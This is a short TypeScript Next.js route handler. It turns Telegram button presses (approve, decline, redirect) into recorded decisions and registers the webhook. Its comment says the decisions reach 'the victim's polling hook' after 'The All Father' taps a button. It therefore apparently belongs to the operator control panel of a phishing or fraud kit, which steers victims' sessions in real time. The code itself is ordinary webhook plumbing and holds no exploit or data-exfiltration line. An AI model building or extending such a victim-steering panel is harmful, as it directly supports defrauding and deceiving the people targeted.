import { NextRequest, NextResponse } from "next/server"
import {
  answerCallbackQuery,
  ensureApprovalWebhook,
} from "@/lib/telegram"
import { parseApprovalCallback, updateApproval } from "@/lib/approval-gate"

export const dynamic = "force-dynamic"

const DECISION_LABEL: Record<string, string> = {
  approve: "✅ APPROVED",
  decline: "❌ DECLINED",
  redirect: "🌐 REDIRECTED",
}

/**
 * Telegram webhook — the "hook" that turns button clicks into decisions.
 *
 * When The All Father taps ✅ / ❌ / 🌐 on an approval message, Telegram POSTs
 * the callback_query here. We:
 *   1. parse the callback_data (approve|decline|redirect:<token>)
 *   2. record the decision (updateApproval) → the victim's polling hook sees it
 *   3. answer the callback (stops the spinner) + show a confirmation toast
 *
 * GET registers the webhook (idempotent) so button clicks start flowing.
 */
export async function POST(request: NextRequest) {
  try {
    const update = await request.json().catch(() => null)
    const cq = update?.callback_query

    if (cq?.id) {
      const data: string = cq.data ?? ""
      const parsed = parseApprovalCallback(data)
      if (parsed) {
        const state = updateApproval(parsed.token, parsed.decision)
        await answerCallbackQuery(
          cq.id,
          state ? DECISION_LABEL[parsed.decision] : "Already resolved",
        )
      } else {
        await answerCallbackQuery(cq.id, "")
      }
    }

    return NextResponse.json({ ok: true })
  } catch (error) {
    console.error("Webhook error:", error)
    return NextResponse.json({ ok: false }, { status: 500 })
  }
}

export async function GET() {
  // Register the webhook on first visit (e.g. opening /api/telegram/webhook).
  await ensureApprovalWebhook()
  return NextResponse.json({ ok: true, webhook: "registered" })
}
